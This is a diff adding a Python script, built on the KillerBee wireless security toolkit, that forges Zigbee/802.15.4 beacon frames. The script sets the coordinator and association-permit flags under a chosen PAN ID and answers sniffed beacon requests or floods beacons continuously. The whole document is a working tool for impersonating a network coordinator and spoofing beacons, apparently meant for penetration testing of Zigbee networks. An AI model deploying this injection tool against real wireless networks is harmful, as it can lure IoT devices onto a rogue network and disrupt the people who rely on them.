@@ -1,0 +1,78 @@
+#!/usr/bin/env python
+import sys
+import argparse
+from time import sleep
+
+import logging
+from killerbee import *
+
+def create_beacon(panid, coordinator, epanid):
+    '''Doing a raw packet creation.'''
+    beacon = [
+        # FRAME CONTROL
+        "\x00", # FCF for beacon 0x00
+        "\x80", # src addressing mode: short/16-bit 0x0002 (this is the only FCF flag marked)
+        "\xd8", # Sequence number for 802.15.4 layer
+        str(struct.pack("H", panid)), # 2-byte shortcode of panid
+        str(struct.pack("H", coordinator)), # only some implementations make it 0000 "\x00\x00", # Source address 0
+        #"\x11\x11",
+        # SUPERFRAME
+        "\xff\xcf", # beacon interval, superframe interval, final cap slot, jbattery extension, pan coordinator (true!), association permit (true)
+        # GTS
+        "\x00",
+        #Pending addresses
+        "\x00",
+        # bullshit zigbee layer packet
+        "\x00\x22\x8c",
+        # Extended PAN ID (Zigbee NWK layer)
+        str(struct.pack("L", epanid)),
+        "\xff\xff\xff\x00"
+    ]
+    return ''.join(beacon)
+
+def response_handler(packet, channel):
+    if len(packet) > 7:
+        if packet[7] == '\x07': # is it a beacon request?
+            sp = create_beacon(spanid, args.coordinator, args.epanid) # respond to the beacon request.
+            kb.sniffer_off()
+            kb.inject(sp)
+            print "Got beacon Packet and Sent Response"
+            kb.sniffer_on()
+        return True
+    else:
+        return False
+
+
+if __name__ == '__main__':
+    # Command-line arguments
+    tohex = lambda s: int(s.replace(':', ''), 16)
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-f', '--channel', '-c', action='store', dest='channel', required=True, type=int, default=11)
+    parser.add_argument('-i', '--interface', action='store', dest='devstring')
+    parser.add_argument('-p', '--panid', action='store', required=True, type=tohex)
+    parser.add_argument('-e', '--epanid', action='store', required=True, type=tohex)
+    parser.add_argument('-s', '--coordinator', action='store', required=False, default=0x0000, type=tohex)
+    parser.add_argument('-g', '--go', action='store_true', required=False, default=False, help="Spam Beacons, don't wait for requests")
+    parser.add_argument('--numloops', action='store', default=1, type=int)
+    args = parser.parse_args()
+
+    kb = KillerBee(device=args.devstring)
+    kb.set_channel(args.channel)
+
+    spanid = args.panid
+
+    # listen in on the channel
+    if not args.go:
+        kb.sniffer_on()
+        while True:
+            # Does not block
+            recvpkt = kb.pnext()
+            # Check for empty packet (timeout) and valid FCS
+            if recvpkt != None and recvpkt[1]:
+                response_handler(recvpkt[0], args.channel)
+
+    else:
+        while True:
+            beacon = create_beacon(args.panid, args.coordinator, args.epanid)
+            kb.inject(beacon)
